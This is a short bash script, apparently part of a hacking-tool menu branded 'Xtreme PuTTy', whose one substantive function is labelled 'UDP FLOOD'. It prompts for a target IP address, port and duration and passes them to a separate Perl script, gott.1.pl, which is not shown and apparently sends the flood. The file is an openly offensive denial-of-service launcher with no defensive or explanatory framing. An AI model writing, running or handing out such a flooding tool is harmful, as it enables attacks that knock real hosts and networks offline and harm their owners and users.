#!/bin/bash
BLACK='\e[0;30m'
BLUE='\e[0;34m'
GREEN='\e[0;32m'
CYAN='\e[0;36m'
RED='\e[0;31m'
PURPLE='\e[0;35m'
BROWN='\e[0;33m'
LIGHTGRAY='\e[0;37m'
DARKGRAY='\e[1;30m'
LIGHTBLUE='\e[1;34m'
LIGHTGREEN='\e[1;32m'
LIGHTCYAN='\e[1;36m'
LIGHTRED='\e[1;31m'
LIGHTPURPLE='\e[1;35m'
YELLOW='\e[1;33m'
WHITE='\e[1;37m'
NC='\e[0m'              # No Color
# Trap Signal Script
#
exit_script()
{
  echo "* * *Trap * * *"
  ./menu
}

udp_flooda()
{
    clear
    echo -e " ${RED} "
	echo "  +-----------------------------------------------------------------------+ "
    echo "  ¦¦¦             Xtreme PuTTy powered by Xtreme Inc                    ¦¦¦ "
    echo "  +-----------------------------------------------------------------------+ "                                                         
    echo -e "  ¦¦¦${RED}                      __  ___                     ${BLUE}                 ¦¦¦ " 
    echo -e "  ¦¦¦${RED}                      \ \/ / |_ _ _ ___ _ __  ___ ${BLUE}                 ¦¦¦ " 
    echo -e "  ¦¦¦${RED}                       >  <|  _| '_/ -_) '  \/ -_)${BLUE}                 ¦¦¦ "
    echo -e "  ¦¦¦${RED}                      /_/\_\\__ |_| \___|_|_|_\___|${BLUE}                 ¦¦¦ "
    echo "  +-----------------------------------------------------------------------+ "
    echo "  ¦¦¦                           Version 1.0                             ¦¦¦ "
    echo "  ¦¦¦+--------------------------------------------------------------------¦ " 
    echo "  ¦¦¦                              UDP FLOOD                            ¦¦¦ "
    echo "  +-----------------------------------------------------------------------+ "
echo "Enter target ip please :"
read ip
echo "Enter a Port Number :"
read port
echo "Enter the time in seconds"
read time
./gott.1.pl $ip $port 0 $time
}

